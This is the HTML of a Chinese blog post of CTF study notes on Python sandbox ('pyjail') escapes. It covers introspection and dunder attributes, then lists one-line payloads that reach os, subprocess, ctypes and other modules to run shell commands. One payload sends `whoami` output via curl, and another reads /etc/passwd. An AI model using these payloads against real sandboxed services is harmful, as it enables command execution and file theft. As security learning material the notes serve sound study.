@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pyjail学习笔记1 | ZnnnnnH2 小屋</title><meta name="author" content="ZnnnnnH2"><meta name="copyright" content="ZnnnnnH2"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pyjail 学习笔记1builtinsbuiltins 是 Python 的内置模块，提供了一些常用的函数和对象。 内省机制 (Introspection)内省机制允许程序在运行时检查对象的类型和属性。 dir()dir() 函数用于查找对象的属性和方法。它返回一个包含对象所有可用属性和方法名称的列表。 type()type() 函数用于返回对象的类型。它可以用于检查变量的类型或获取对象的类信息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pyjail学习笔记1">
+<meta property="og:url" content="https://znnnnnh2.icu/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/index.html">
+<meta property="og:site_name" content="ZnnnnnH2 小屋">
+<meta property="og:description" content="pyjail 学习笔记1builtinsbuiltins 是 Python 的内置模块，提供了一些常用的函数和对象。 内省机制 (Introspection)内省机制允许程序在运行时检查对象的类型和属性。 dir()dir() 函数用于查找对象的属性和方法。它返回一个包含对象所有可用属性和方法名称的列表。 type()type() 函数用于返回对象的类型。它可以用于检查变量的类型或获取对象的类信息">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://znnnnnh2.icu/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-08-13T11:36:15.000Z">
+<meta property="article:modified_time" content="2025-08-13T15:58:44.281Z">
+<meta property="article:author" content="ZnnnnnH2">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="pyjai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://znnnnnh2.icu/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pyjail学习笔记1",
+  "url": "https://znnnnnh2.icu/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/",
+  "image": "https://znnnnnh2.icu/img/butterfly-icon.png",
+  "datePublished": "2025-08-13T11:36:15.000Z",
+  "dateModified": "2025-08-13T15:58:44.281Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZnnnnnH2",
+      "url": "https://znnnnnh2.icu"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://znnnnnh2.icu/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pyjail学习笔记1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZnnnnnH2 小屋</span></a><a class="nav-page-title" href="/"><span class="site-name">pyjail学习笔记1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">pyjail学习笔记1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-13T11:36:15.000Z" title="发表于 2025-08-13 19:36:15">2025-08-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-13T15:58:44.281Z" title="更新于 2025-08-13 23:58:44">2025-08-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="pyjail-学习笔记1"><a href="#pyjail-学习笔记1" class="headerlink" title="pyjail 学习笔记1"></a>pyjail 学习笔记1</h1><h2 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h2><p><code>builtins</code> 是 Python 的内置模块，提供了一些常用的函数和对象。</p>
+<h2 id="内省机制-Introspection"><a href="#内省机制-Introspection" class="headerlink" title="内省机制 (Introspection)"></a>内省机制 (Introspection)</h2><p>内省机制允许程序在运行时检查对象的类型和属性。</p>
+<h3 id="dir"><a href="#dir" class="headerlink" title="dir()"></a><code>dir()</code></h3><p><code>dir()</code> 函数用于查找对象的属性和方法。它返回一个包含对象所有可用属性和方法名称的列表。</p>
+<h3 id="type"><a href="#type" class="headerlink" title="type()"></a><code>type()</code></h3><p><code>type()</code> 函数用于返回对象的类型。它可以用于检查变量的类型或获取对象的类信息。</p>
+<h3 id="getattr-setattr-hasattr-delattr"><a href="#getattr-setattr-hasattr-delattr" class="headerlink" title="getattr()&#x2F;setattr()&#x2F;hasattr()&#x2F;delattr()"></a><code>getattr()</code>&#x2F;<code>setattr()</code>&#x2F;<code>hasattr()</code>&#x2F;<code>delattr()</code></h3><p>这些内置函数用于获取、设置、检查和删除对象的属性。</p>
+<h3 id="help"><a href="#help" class="headerlink" title="help()"></a><code>help()</code></h3><p><code>help()</code> 函数用于查看对象的帮助文档。它可以提供有关对象的详细信息，包括方法、属性和用法示例。</p>
+<h3 id="globals-locals"><a href="#globals-locals" class="headerlink" title="globals()&#x2F;locals()"></a><code>globals()</code>&#x2F;<code>locals()</code></h3><p><code>globals()</code> 函数用于返回当前全局符号表的字典，包含所有全局变量和函数。</p>
+<p><code>locals()</code> 函数用于返回当前局部符号表的字典，包含所有局部变量和函数。</p>
+<h3 id="vars"><a href="#vars" class="headerlink" title="vars()"></a><code>vars()</code></h3><p><code>vars()</code> 函数用于返回对象的 <code>__dict__</code> 属性，即对象的属性字典。</p>
+<h2 id="python-魔术方法"><a href="#python-魔术方法" class="headerlink" title="python 魔术方法"></a>python 魔术方法</h2><p>魔术方法是 Python 中以双下划线开头和结尾的方法。这些方法也被称为“特殊方法”或“dunder 方法”。它们允许开发者自定义类的行为，例如对象的创建、表示和运算等。</p>
+<h3 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h3><ul>
+<li><code>__init__(self, ...)</code>：构造方法，用于初始化对象。</li>
+<li><code>__str__(self)</code>：返回对象的字符串表示，用于 <code>print()</code> 函数。</li>
+<li><code>__repr__(self)</code>：返回对象的官方字符串表示，用于调试。</li>
+<li><code>__len__(self)</code>：返回对象的长度，用于 <code>len()</code> 函数。</li>
+<li><code>__getitem__(self, key)</code>：支持索引访问，用于 <code>obj[key]</code>。</li>
+<li><code>__setitem__(self, key, value)</code>：支持索引赋值，用于 <code>obj[key] = value</code>。</li>
+<li><code>__delitem__(self, key)</code>：支持索引删除，用于 <code>del obj[key]</code>。</li>
+<li><code>__iter__(self)</code>：返回可迭代对象，用于 <code>for</code> 循环。</li>
+<li><code>__next__(self)</code>：返回下一个迭代值，用于迭代器。</li>
+</ul>
+<h3 id="builtins-1"><a href="#builtins-1" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p><code>__builtins__</code> 是一个包含所有内置对象的模块，包括内置函数、异常和其他对象。可以通过 <code>import builtins</code> 访问。</p>
+<h3 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h3><p><code>__import__</code> 是一个内置函数，用于动态导入模块。它接受模块名称作为字符串，并返回模块对象。</p>
+<p>如import sys相当于<code>__import__(&#39;sys&#39;)</code>，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤</p>
+<h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p>用于返回对象的类。</p>
+<h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><p><code>__base__</code> 是一个属性，用于返回类的直接基类。</p>
+<h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p><code>__mro__</code> 是一个属性，用于返回类的继承关系（方法解析顺序）。类似于 <code>__bases__</code>，但 <code>__mro__</code> 包含了所有基类，而不仅仅是直接基类。</p>
+<h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p><code>__globals__</code> 是一个属性，能够以 <code>dict</code> 的形式返回函数（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 <code>modules</code>。</p>
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__"></a><code>__subclasses__</code></h3><p><code>__subclasses__</code> 是一个方法，用于返回当前类的所有子类。</p>
+<h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p><code>__dict__</code> 是一个特殊的属性，它以字典形式存储对象的可写属性。每个对象（包括类、实例、模块等）都有自己的 <code>__dict__</code> 属性，通常用于保存该对象的命名空间，即与该对象相关的所有属性和值。</p>
+<h2 id="no-builtins-构造"><a href="#no-builtins-构造" class="headerlink" title="no-builtins 构造"></a>no-builtins 构造</h2><p>在没有内置函数的情况下，可以通过 python 内省机制来绕过限制，通过内置类重新获取 <code>__builtins</code> ，然后再利用。</p>
+<h3 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h3><ol>
+<li>获取 <code>object</code> 类</li>
+<li>通过 <code>__subclasses__</code> 获取所有子类</li>
+<li>在子类中查找重载过<code>__init__</code>函数的类，因为重载过<code>__init__</code>函数的<code>__globals__</code>属性会包含<code>__builtins__</code>键或其他可利用参数<ol>
+<li>利用<code>__builtins__</code><ol>
+<li>通过 <code>.__init__.__globals__[&#39;__builtins__&#39;]</code> 键获取到 builtins 模块</li>
+<li>由于 builtins 模块中包含了 file, eval 等函数,最后一步就是调用这些函数.</li>
+</ol>
+</li>
+<li>利用其他函数. 因为 <code>__globals__</code> 中也会包含已经导入的模块,所以在某些子类的 <code>.__init__.__globals__</code> 中也会发现诸如 <code>os</code> 模块的身影,因此直接调用即可.</li>
+</ol>
+</li>
+</ol>
+<h4 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h4><h5 id="如何寻找重载过-init-函数的类？"><a href="#如何寻找重载过-init-函数的类？" class="headerlink" title="如何寻找重载过__init__函数的类？"></a>如何寻找重载过<code>__init__</code>函数的类？</h5><p>找到重载过的<code>__init__</code>函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__</span><br></pre></td></tr></table></figure>
+
+<p>在获取初始化属性后，带 <code>wrapper</code> 的说明没有重载，寻找不带 <code>warpper</code> 的，因为<code>wrapper</code>是指这些函数并没有被重载，这时它们并不是 function ，不具有<code>__globals__</code>属性。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._WeakValueDictionary&#x27;</span>&gt; &lt;function _WeakValueDictionary.__init__ at <span class="number">0x00000269A1321260</span>&gt; <span class="comment"># 重载过</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt; &lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;type&#x27;</span> objects&gt; <span class="comment"># 未重载过</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="playload-收集"><a href="#playload-收集" class="headerlink" title="playload 收集"></a>playload 收集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;os.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#subprocess</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;subprocess&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;Popen&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;subprocess.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;Popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#builtins</span></span><br><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure>
+
+<h5 id="FileRead"><a href="#FileRead" class="headerlink" title="FileRead"></a>FileRead</h5><p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">pyjail合集</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://znnnnnh2.icu">ZnnnnnH2</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://znnnnnh2.icu/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">https://znnnnnh2.icu/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://znnnnnh2.icu" target="_blank">ZnnnnnH2 小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/pyjai/">pyjai</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 